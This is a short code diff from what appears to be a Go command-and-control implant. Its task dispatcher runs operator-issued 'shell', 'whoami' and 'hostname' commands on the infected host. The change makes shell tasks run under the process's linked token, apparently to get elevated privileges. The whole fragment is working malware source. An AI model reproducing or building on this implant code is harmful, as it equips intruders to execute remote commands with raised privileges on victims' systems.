@@ -26,6 +26,7 @@ var PortFwdListenerMap = make(map[int]net.Listener)
 var PortFwdListenerQuitMap = make(map[int](chan bool))
 
 var Token, _ = hg.GetCurrentToken()
+var TokenLinked, _ = Token.GetLinkedToken()
 
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
@@ -37,7 +38,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 		switch task {
 		case "shell":
-			data, _ = hg.PsReturnT(taskData, Token)
+			data, _ = hg.PsReturnT(taskData, TokenLinked)
 		case "whoami":
 			data, _ = initialization.GetUsername()
 		case "hostname":
